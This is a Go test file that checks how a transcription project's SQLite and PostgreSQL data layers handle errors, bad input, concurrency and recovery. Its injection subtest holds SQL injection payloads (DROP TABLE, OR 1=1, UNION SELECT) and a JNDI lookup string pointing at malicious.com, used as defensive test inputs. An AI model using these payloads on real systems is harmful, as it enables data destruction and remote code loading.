package tests

import (
	"database/sql"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"tiktok-whisper/internal/app/repository"
	"tiktok-whisper/internal/app/repository/pg"
	"tiktok-whisper/internal/app/repository/sqlite"
	"tiktok-whisper/internal/app/testutil"

	_ "github.com/lib/pq"
	_ "github.com/mattn/go-sqlite3"
)

// ErrorScenarioTestSuite provides comprehensive error scenario testing
type ErrorScenarioTestSuite struct {
	name string
	dao  repository.TranscriptionDAO
	db   *sql.DB
}

// TestErrorScenarios tests various error conditions across all database implementations
func TestErrorScenarios(t *testing.T) {
	databases := []struct {
		name      string
		available func() bool
		setup     func(t *testing.T) ErrorScenarioTestSuite
	}{
		{
			name:      "SQLite",
			available: func() bool { return true },
			setup:     setupSQLiteErrorTest,
		},
		{
			name:      "PostgreSQL",
			available: isPostgresAvailable,
			setup:     setupPostgresErrorTest,
		},
	}

	for _, db := range databases {
		if !db.available() {
			t.Logf("Skipping %s error scenario tests - not available", db.name)
			continue
		}

		t.Run(db.name, func(t *testing.T) {
			suite := db.setup(t)
			defer suite.dao.Close()

			runAllErrorScenarios(t, suite)
		})
	}
}

// runAllErrorScenarios executes all error scenario tests
func runAllErrorScenarios(t *testing.T, suite ErrorScenarioTestSuite) {
	testConnectionErrors(t, suite)
	testDatabaseConstraintErrors(t, suite)
	testCorruptedDataErrors(t, suite)
	testResourceExhaustionErrors(t, suite)
	testConcurrencyErrors(t, suite)
	testTransactionErrors(t, suite)
	testRecoveryScenarios(t, suite)
}

// testConnectionErrors tests various connection-related error scenarios
func testConnectionErrors(t *testing.T, suite ErrorScenarioTestSuite) {
	t.Run("ConnectionErrors", func(t *testing.T) {
		t.Run("ClosedConnection", func(t *testing.T) {
			// Create a new DAO instance that we can close
			var testDAO TranscriptionDAO
			var testDB *sql.DB

			switch suite.name {
			case "SQLite":
				testDB = testutil.SetupTestSQLite(t)
				sqliteDAO := &sqlite.SQLiteDB{}
				type sqliteDBInternal struct {
					db *sql.DB
				}
				(*sqliteDBInternal)(sqliteDAO).db = testDB
				testDAO = sqliteDAO
			case "PostgreSQL":
				testDB = testutil.SetupTestPostgres(t)
				postgresDAO := &pg.PostgresDB{}
				type postgresDBInternal struct {
					db *sql.DB
				}
				(*postgresDBInternal)(postgresDAO).db = testDB
				testDAO = postgresDAO
			}

			// Close the database connection
			err := testDB.Close()
			if err != nil {
				t.Fatalf("Failed to close test database: %v", err)
			}

			// Now try to use the DAO with closed connection
			_, err = testDAO.CheckIfFileProcessed("test.mp3")
			if err == nil {
				t.Error("Expected error when using closed database connection")
			}

			// RecordToDB should also fail (though it might panic depending on implementation)
			defer func() {
				if r := recover(); r != nil {
					t.Logf("RecordToDB panicked as expected with closed connection: %v", r)
				}
			}()

			// This might panic, so we wrap it
			func() {
				defer func() {
					if r := recover(); r == nil {
						// If it doesn't panic, check if it returned an error
						// Note: Current implementation might panic instead of returning error
					}
				}()

				testDAO.RecordToDB(
					"test_user",
					"/test",
					"test.mp3",
					"test.mp3",
					120,
					"test",
					time.Now(),
					0,
					"",
				)
			}()
		})

		t.Run("InvalidDatabasePath", func(t *testing.T) {
			if suite.name == "SQLite" {
				// Test with invalid file path
				invalidDAO := sqlite.NewSQLiteDB("/invalid/path/that/does/not/exist/test.db")
				if invalidDAO != nil {
					// The current implementation might not fail immediately
					// Try to use it to see if it fails
					defer func() {
						if r := recover(); r != nil {
							t.Logf("Invalid database path caused panic as expected: %v", r)
						}
					}()

					_, err := invalidDAO.CheckIfFileProcessed("test.mp3")
					if err == nil {
						t.Error("Expected error with invalid database path")
					}
				}
			}
		})

		t.Run("NetworkTimeout", func(t *testing.T) {
			if suite.name == "PostgreSQL" {
				// Test with connection that times out
				// Note: This is difficult to test without network manipulation
				// We'll skip this for now as it requires special setup
				t.Skip("Network timeout testing requires special network setup")
			}
		})
	})
}

// testDatabaseConstraintErrors tests database constraint violations
func testDatabaseConstraintErrors(t *testing.T, suite ErrorScenarioTestSuite) {
	t.Run("ConstraintErrors", func(t *testing.T) {
		testutil.CleanTestData(t, suite.db)

		t.Run("DuplicateKey", func(t *testing.T) {
			// First insert should succeed
			suite.dao.RecordToDB(
				"constraint_user",
				"/test/constraint",
				"duplicate_file.mp3",
				"duplicate_file.mp3",
				120,
				"First transcription",
				time.Now(),
				0,
				"",
			)

			// Second insert with same file_name might cause issues depending on schema
			// Note: Current schema might not have unique constraints on file_name
			defer func() {
				if r := recover(); r != nil {
					t.Logf("Duplicate key caused panic: %v", r)
				}
			}()

			suite.dao.RecordToDB(
				"constraint_user",
				"/test/constraint",
				"duplicate_file.mp3",
				"duplicate_file.mp3",
				180,
				"Second transcription",
				time.Now(),
				0,
				"",
			)

			// Check that both records exist (current schema allows duplicates)
			count := testutil.GetTestDataCount(t, suite.db)
			if count != 2 {
				t.Logf("Expected 2 records (schema allows duplicates), got %d", count)
			}
		})

		t.Run("NullConstraints", func(t *testing.T) {
			// Test with potentially problematic NULL values
			// Current implementation might not enforce NOT NULL constraints

			defer func() {
				if r := recover(); r != nil {
					t.Logf("NULL constraint violation caused panic: %v", r)
				}
			}()

			// These might be allowed depending on schema definition
			suite.dao.RecordToDB(
				"", // Empty user - might be allowed
				"",
				"",
				"",
				0,
				"",
				time.Now(),
				0,
				"",
			)
		})

		t.Run("DataTypeViolations", func(t *testing.T) {
			// Test extreme values that might cause type overflow
			defer func() {
				if r := recover(); r != nil {
					t.Logf("Data type violation caused panic: %v", r)
				}
			}()

			// Very large integer that might overflow
			suite.dao.RecordToDB(
				"type_test_user",
				"/test/types",
				"large_duration.mp3",
				"large_duration.mp3",
				999999999, // Very large duration
				"Type test transcription",
				time.Now(),
				0,
				"",
			)

			// Negative values
			suite.dao.RecordToDB(
				"type_test_user",
				"/test/types",
				"negative_duration.mp3",
				"negative_duration.mp3",
				-1, // Negative duration
				"Negative duration test",
				time.Now(),
				0,
				"",
			)
		})
	})
}

// testCorruptedDataErrors tests handling of corrupted or malformed data
func testCorruptedDataErrors(t *testing.T, suite ErrorScenarioTestSuite) {
	t.Run("CorruptedData", func(t *testing.T) {
		testutil.CleanTestData(t, suite.db)

		t.Run("MalformedUnicode", func(t *testing.T) {
			// Test with potentially problematic Unicode characters
			malformedTexts := []string{
				string([]byte{0xFF, 0xFE, 0xFD}), // Invalid UTF-8 sequence
				"\x00\x01\x02\x03",               // Control characters
				"Text with \uFFFD replacement",   // Unicode replacement character
				"🎵\U0001F3B5🎶\U0001F3B6",         // Mixed emoji
			}

			for i, text := range malformedTexts {
				func() {
					defer func() {
						if r := recover(); r != nil {
							t.Logf("Malformed Unicode caused panic: %v", r)
						}
					}()

					suite.dao.RecordToDB(
						"unicode_test_user",
						"/test/unicode",
						fmt.Sprintf("unicode_file_%d.mp3", i),
						fmt.Sprintf("unicode_file_%d.mp3", i),
						120,
						text,
						time.Now(),
						0,
						"",
					)
				}()
			}
		})

		t.Run("ExtremelyLongStrings", func(t *testing.T) {
			// Test with extremely long strings that might cause issues
			veryLongText := strings.Repeat("A", 10*1024*1024) // 10MB string

			defer func() {
				if r := recover(); r != nil {
					t.Logf("Extremely long string caused panic: %v", r)
				}
			}()

			suite.dao.RecordToDB(
				"long_string_user",
				"/test/long",
				"very_long_transcription.mp3",
				"very_long_transcription.mp3",
				3600,
				veryLongText,
				time.Now(),
				0,
				"",
			)
		})

		t.Run("SQLInjectionAttempts", func(t *testing.T) {
			// Test with SQL injection payloads
			injectionPayloads := []string{
				"'; DROP TABLE transcriptions; --",
				"' OR '1'='1",
				"'; INSERT INTO transcriptions VALUES (999, 'hacker', '', '', '', 0, '', NOW(), 0, ''); --",
				"' UNION SELECT * FROM transcriptions WHERE '1'='1",
				"${jndi:ldap://malicious.com/a}",
			}

			for i, payload := range injectionPayloads {
				func() {
					defer func() {
						if r := recover(); r != nil {
							t.Logf("SQL injection attempt caused panic: %v", r)
						}
					}()

					suite.dao.RecordToDB(
						payload,
						"/test/injection",
						fmt.Sprintf("injection_file_%d.mp3", i),
						fmt.Sprintf("injection_file_%d.mp3", i),
						120,
						payload,
						time.Now(),
						0,
						"",
					)

					// Verify that the table still exists and wasn't dropped
					count := testutil.GetTestDataCount(t, suite.db)
					if count < 0 {
						t.Error("Table may have been compromised by SQL injection")
					}
				}()
			}

			// Verify database integrity after injection attempts
			var tableExists bool
			var err error

			switch suite.name {
			case "SQLite":
				err = suite.db.QueryRow("SELECT name FROM sqlite_master WHERE type='table' AND name='transcriptions'").Scan(&tableExists)
			case "PostgreSQL":
				err = suite.db.QueryRow("SELECT EXISTS (SELECT FROM information_schema.tables WHERE table_name = 'transcriptions')").Scan(&tableExists)
			}

			if err != nil || !tableExists {
				t.Error("Database table may have been compromised")
			}
		})
	})
}

// testResourceExhaustionErrors tests resource exhaustion scenarios
func testResourceExhaustionErrors(t *testing.T, suite ErrorScenarioTestSuite) {
	t.Run("ResourceExhaustion", func(t *testing.T) {
		testutil.CleanTestData(t, suite.db)

		t.Run("DiskSpaceExhaustion", func(t *testing.T) {
			// This is difficult to test without actually filling the disk
			// We'll simulate by trying to insert a very large amount of data
			t.Skip("Disk space exhaustion testing requires special setup")
		})

		t.Run("MemoryPressure", func(t *testing.T) {
			// Test behavior under memory pressure by inserting many large records
			defer func() {
				if r := recover(); r != nil {
					t.Logf("Memory pressure caused panic: %v", r)
				}
			}()

			benchmark := testutil.NewBenchmarkHelper("MemoryPressure")
			benchmark.Start()

			// Insert many large records
			for i := 0; i < 100; i++ {
				largeTranscription := generateLargeText(100 * 1024) // 100KB each
				suite.dao.RecordToDB(
					"memory_pressure_user",
					"/test/memory",
					fmt.Sprintf("memory_file_%d.mp3", i),
					fmt.Sprintf("memory_file_%d.mp3", i),
					3600,
					largeTranscription,
					time.Now(),
					0,
					"",
				)
			}

			benchmark.Stop()

			// Check if memory usage is reasonable
			benchmark.AssertMemoryUsageLessThan(t, 100*1024*1024) // 100MB

			if testing.Verbose() {
				t.Log(benchmark.Report())
			}
		})

		t.Run("ConnectionPoolExhaustion", func(t *testing.T) {
			// Test what happens when we exhaust database connections
			if suite.name == "SQLite" {
				t.Skip("SQLite doesn't use connection pools in the same way")
			}

			// This would require opening many connections simultaneously
			t.Skip("Connection pool exhaustion testing requires special setup")
		})
	})
}

// testConcurrencyErrors tests concurrency-related error scenarios
func testConcurrencyErrors(t *testing.T, suite ErrorScenarioTestSuite) {
	t.Run("ConcurrencyErrors", func(t *testing.T) {
		testutil.CleanTestData(t, suite.db)

		t.Run("DeadlockScenarios", func(t *testing.T) {
			// Test potential deadlock scenarios
			// Note: Current implementation may not be susceptible to deadlocks
			// depending on how transactions are handled

			const numGoroutines = 10
			const operationsPerGoroutine = 20

			errorChan := make(chan error, numGoroutines)
			done := make(chan bool, numGoroutines)

			for i := 0; i < numGoroutines; i++ {
				go func(goroutineID int) {
					defer func() {
						if r := recover(); r != nil {
							errorChan <- fmt.Errorf("goroutine %d panicked: %v", goroutineID, r)
						}
						done <- true
					}()

					for j := 0; j < operationsPerGoroutine; j++ {
						// Alternate between different operations to increase chance of conflicts
						if j%2 == 0 {
							suite.dao.RecordToDB(
								fmt.Sprintf("deadlock_user_%d", goroutineID),
								"/test/deadlock",
								fmt.Sprintf("deadlock_file_%d_%d.mp3", goroutineID, j),
								fmt.Sprintf("deadlock_file_%d_%d.mp3", goroutineID, j),
								120,
								"Deadlock test transcription",
								time.Now(),
								0,
								"",
							)
						} else {
							_, _ = suite.dao.CheckIfFileProcessed(fmt.Sprintf("deadlock_file_%d_%d.mp3", goroutineID, j-1))
						}
					}
				}(i)
			}

			// Wait for all goroutines to complete
			for i := 0; i < numGoroutines; i++ {
				<-done
			}

			// Check for any errors
			close(errorChan)
			for err := range errorChan {
				t.Logf("Concurrency error: %v", err)
			}

			// Verify data consistency
			count := testutil.GetTestDataCount(t, suite.db)
			expectedCount := numGoroutines * operationsPerGoroutine / 2 // Only half the operations insert data
			if count < expectedCount-10 || count > expectedCount+10 {
				t.Logf("Unexpected record count after concurrent operations: got %d, expected ~%d", count, expectedCount)
			}
		})

		t.Run("RaceConditions", func(t *testing.T) {
			// Test for race conditions in file processing checks
			const numGoroutines = 20
			const fileName = "race_condition_file.mp3"

			// First, insert a record
			suite.dao.RecordToDB(
				"race_test_user",
				"/test/race",
				fileName,
				fileName,
				120,
				"Race condition test",
				time.Now(),
				0,
				"",
			)

			results := make(chan bool, numGoroutines)
			errors := make(chan error, numGoroutines)

			// Have multiple goroutines check the same file simultaneously
			for i := 0; i < numGoroutines; i++ {
				go func() {
					defer func() {
						if r := recover(); r != nil {
							errors <- fmt.Errorf("race condition check panicked: %v", r)
							return
						}
					}()

					id, err := suite.dao.CheckIfFileProcessed(fileName)
					if err != nil {
						errors <- err
					} else {
						results <- id > 0
					}
				}()
			}

			// Collect results
			successCount := 0
			for i := 0; i < numGoroutines; i++ {
				select {
				case success := <-results:
					if success {
						successCount++
					}
				case err := <-errors:
					t.Logf("Race condition error: %v", err)
				}
			}

			// All checks should succeed since the file exists
			if successCount < numGoroutines-5 { // Allow for some tolerance
				t.Errorf("Expected most checks to succeed, got %d/%d", successCount, numGoroutines)
			}
		})
	})
}

// testTransactionErrors tests transaction-related error scenarios
func testTransactionErrors(t *testing.T, suite ErrorScenarioTestSuite) {
	t.Run("TransactionErrors", func(t *testing.T) {
		testutil.CleanTestData(t, suite.db)

		t.Run("InterruptedTransactions", func(t *testing.T) {
			// Test what happens when transactions are interrupted
			// Note: Current implementation may not use explicit transactions

			// Begin a manual transaction to test behavior
			tx, err := suite.db.Begin()
			if err != nil {
				t.Fatalf("Failed to begin transaction: %v", err)
			}

			// Insert some data in transaction
			_, err = tx.Exec(`
				INSERT INTO transcriptions (user, input_dir, file_name, mp3_file_name, audio_duration, transcription, last_conversion_time, has_error, error_message)
				VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
			`, "tx_user", "/test/tx", "tx_file.mp3", "tx_file.mp3", 120, "Transaction test", time.Now(), 0, "")

			if err != nil {
				t.Fatalf("Failed to insert in transaction: %v", err)
			}

			// Rollback the transaction
			err = tx.Rollback()
			if err != nil {
				t.Fatalf("Failed to rollback transaction: %v", err)
			}

			// Verify that the data was not committed
			_, err = suite.dao.CheckIfFileProcessed("tx_file.mp3")
			if err == nil {
				t.Error("Expected file to not be found after transaction rollback")
			}
		})

		t.Run("TransactionTimeouts", func(t *testing.T) {
			// Test transaction timeouts
			// This requires special database configuration and is skipped for now
			t.Skip("Transaction timeout testing requires special database configuration")
		})
	})
}

// testRecoveryScenarios tests error recovery and cleanup scenarios
func testRecoveryScenarios(t *testing.T, suite ErrorScenarioTestSuite) {
	t.Run("RecoveryScenarios", func(t *testing.T) {
		testutil.CleanTestData(t, suite.db)

		t.Run("DatabaseRecovery", func(t *testing.T) {
			// Test that the database can recover from various error states

			// Insert some valid data
			suite.dao.RecordToDB(
				"recovery_user",
				"/test/recovery",
				"recovery_file.mp3",
				"recovery_file.mp3",
				120,
				"Recovery test transcription",
				time.Now(),
				0,
				"",
			)

			// Verify it was inserted
			id, err := suite.dao.CheckIfFileProcessed("recovery_file.mp3")
			if err != nil {
				t.Fatalf("Failed to verify initial insert: %v", err)
			}
			if id <= 0 {
				t.Fatal("Expected valid ID after insert")
			}

			// Try to cause an error and then recover
			defer func() {
				if r := recover(); r != nil {
					t.Logf("Recovered from panic: %v", r)
				}
			}()

			// Attempt an operation that might fail
			suite.dao.RecordToDB(
				"recovery_user",
				"/test/recovery",
				"", // Empty filename might cause issues
				"",
				-1, // Invalid duration
				"",
				time.Time{}, // Zero time
				-1,          // Invalid error flag
				"",
			)

			// Verify that the database is still operational
			id2, err := suite.dao.CheckIfFileProcessed("recovery_file.mp3")
			if err != nil {
				t.Errorf("Database not operational after error: %v", err)
			}
			if id2 != id {
				t.Errorf("Data corruption detected: original ID %d, new ID %d", id, id2)
			}
		})

		t.Run("DataIntegrityAfterErrors", func(t *testing.T) {
			// Verify that data integrity is maintained even after errors

			initialCount := testutil.GetTestDataCount(t, suite.db)

			// Attempt several operations that might fail
			errorOperations := []func(){
				func() {
					defer func() { recover() }()
					suite.dao.RecordToDB("", "", "", "", -1, "", time.Time{}, -1, "")
				},
				func() {
					defer func() { recover() }()
					longText := strings.Repeat("X", 100*1024*1024) // 100MB
					suite.dao.RecordToDB("integrity_user", "/test", "integrity.mp3", "integrity.mp3", 120, longText, time.Now(), 0, "")
				},
				func() {
					defer func() { recover() }()
					suite.dao.RecordToDB("'; DROP TABLE transcriptions; --", "/test", "sql.mp3", "sql.mp3", 120, "test", time.Now(), 0, "")
				},
			}

			for i, op := range errorOperations {
				func() {
					defer func() {
						if r := recover(); r != nil {
							t.Logf("Error operation %d panicked: %v", i, r)
						}
					}()
					op()
				}()
			}

			// Verify database is still operational
			suite.dao.RecordToDB(
				"integrity_test_user",
				"/test/integrity",
				"final_test.mp3",
				"final_test.mp3",
				120,
				"Final integrity test",
				time.Now(),
				0,
				"",
			)

			finalCount := testutil.GetTestDataCount(t, suite.db)
			if finalCount < initialCount {
				t.Error("Data loss detected after error operations")
			}

			// Verify specific record exists
			_, err := suite.dao.CheckIfFileProcessed("final_test.mp3")
			if err != nil {
				t.Errorf("Failed to verify final test record: %v", err)
			}
		})
	})
}

// Setup functions for error testing

func setupSQLiteErrorTest(t *testing.T) ErrorScenarioTestSuite {
	db := testutil.SetupTestSQLite(t)
	sqliteDAO := &sqlite.SQLiteDB{}
	type sqliteDBInternal struct {
		db *sql.DB
	}
	(*sqliteDBInternal)(sqliteDAO).db = db

	return ErrorScenarioTestSuite{
		name: "SQLite",
		dao:  sqliteDAO,
		db:   db,
	}
}

func setupPostgresErrorTest(t *testing.T) ErrorScenarioTestSuite {
	db := testutil.SetupTestPostgres(t)
	postgresDAO := &pg.PostgresDB{}
	type postgresDBInternal struct {
		db *sql.DB
	}
	(*postgresDBInternal)(postgresDAO).db = db

	return ErrorScenarioTestSuite{
		name: "PostgreSQL",
		dao:  postgresDAO,
		db:   db,
	}
}

// Helper functions

// generateLargeText generates a large text string for testing
func generateLargeText(size int) string {
	const chunk = "This is a large text chunk for error testing with various characters: áéíóú 测试 🎵 !@#$%^&*(). "
	result := strings.Builder{}
	result.Grow(size)

	for result.Len() < size {
		remaining := size - result.Len()
		if remaining >= len(chunk) {
			result.WriteString(chunk)
		} else {
			result.WriteString(chunk[:remaining])
		}
	}

	return result.String()
}

// isPostgresAvailable checks if PostgreSQL is available for testing
func isPostgresAvailable() bool {
	if os.Getenv("POSTGRES_TEST_URL") != "" {
		return true
	}

	db, err := sql.Open("postgres", "postgres://postgres:postgres@localhost/postgres?sslmode=disable")
	if err != nil {
		return false
	}
	defer db.Close()

	return db.Ping() == nil
}
